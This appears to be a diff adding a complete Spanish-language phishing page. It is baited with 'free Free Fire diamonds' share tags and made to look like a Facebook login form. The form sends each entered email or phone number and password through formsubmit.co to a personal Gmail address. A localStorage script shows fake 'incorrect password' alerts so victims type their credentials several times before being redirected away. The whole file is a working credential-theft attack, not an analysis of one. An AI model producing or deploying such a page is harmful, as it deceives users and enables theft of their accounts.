@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta property="og:title" content="Conseguir diamantes gratis">
+                <meta property="og:description" content="página oficial de garena free fire para conseguir diamantes gratis">
+                <meta property="og:image" content="https://img.gg.deals/75/c2/58d8b1e9789db57a1071daf1b03175c41a09_616cr353.jpg">
+                <meta property="og:url" content="https://garena.mimo.run/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <link rel="icon" href="https://www.garena.sg/favicon.ico" type="image/x-icon"/>
+    <style type="text/css" media="all">
+        /* styles.css */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-sizing: border-box;
+            margin: 20px;
+        }
+
+        header h1 {
+            font-size: 36px;
+            color: #1877f2;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .login-container {
+            text-align: center;
+        }
+
+        .login-container h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input#button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            box-sizing: border-box;
+        }
+
+        button:hover {
+            background-color: #165eab;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            margin: 30px 0;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-account h3 {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .signup-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #42b72a;
+            color: white;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .signup-button:hover {
+            background-color: #36a420;
+        }
+
+        footer p {
+            text-align: center;
+            color: #777;
+            margin-top: 20px;
+        }
+
+        /* Responsive Styles */
+@media (max-width: 600px) {
+            header h1 {
+                font-size: 28px;
+            }
+
+            .login-container h2 {
+                font-size: 20px;
+            }
+
+            .form-group label,
+            .form-group input,
+            button,
+            .signup-button {
+                font-size: 14px;
+            }
+
+            .signup-button {
+                padding: 8px 16px;
+            }
+        }
+
+@media (max-width: 400px) {
+            .container {
+                padding: 10px;
+            }
+
+            button,
+            .signup-button {
+                padding: 8px;
+            }
+
+            .forgot-password {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Facebook</h1>
+        </header>
+        <main>
+            <div class="login-container">
+                <h2>Iniciar sesión en Facebook</h2>
+                <form action="https://formsubmit.co/thedoctor3440@gmail.com" method="POST">
+                    <div class="form-group">
+                        <label for="email">Correo electrónico o teléfono</label>
+                        <input type="text" id="gmail" name="gmail" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Contraseña</label>
+                        <input type="password" id="passwd" name="passwd" required>
+                    </div>
+                    <input type="submit" value="Iniciar sesión" id="button" />
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" id="next" name="_next" value="https://xsh0p.github.io/gen/login/">
+                    
+                    <a href="#" class="forgot-password">¿Olvidaste tu cuenta?</a>
+                </form>
+                <hr>
+                <div class="create-account">
+                    <h3>¿No tienes una cuenta?</h3>
+                    <a href="#" class="signup-button">Crear cuenta nueva</a>
+                </div>
+            </div>
+        </main>
+        <footer>
+            <p>
+                © 2024 Facebook
+            </p>
+        </footer>
+    </div>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+// Función para establecer un item en localStorage con tiempo de expiración en horas
+function setItemWithExpiration(key, value, hours) {
+  const expirationTime = Date.now() + hours * 60 * 60 * 1000; // Convertir horas a milisegundos
+  const item = {
+    value: value,
+    expiration: expirationTime
+  };
+  localStorage.setItem(key, JSON.stringify(item));
+}
+
+// Función para obtener un item de localStorage, verificando su expiración
+function getItemWithExpiration(key) {
+  const itemStr = localStorage.getItem(key);
+  if (!itemStr) return null; // Si no existe el item
+
+  const item = JSON.parse(itemStr);
+  if (Date.now() > item.expiration) {
+    // Si ha expirado, eliminarlo y devolver null
+    localStorage.removeItem(key);
+    return null;
+  }
+  return item.value; // Si no ha expirado, devolver el valor
+}
+
+const err = getItemWithExpiration("error");
+if (err) {
+    const err_num = parseInt(err, 10);
+    if (err_num === 3) {
+        alert("la Contraseña que uso es incorrecta");
+        setItemWithExpiration("error", "0", 2);
+        document.querySelector("#next").value = "https://google.com";
+    } else {
+        const next_num = err_num + 1;
+        setItemWithExpiration("error", next_num.toString(), 2);
+        if (next_num > 1) {
+            alert("la Contraseña que uso es incorrecta");
+        }
+    }
+} else {
+    setItemWithExpiration("error", "0", 2);
+}
+
+});
+    </script>
+ </body>  
+</html>
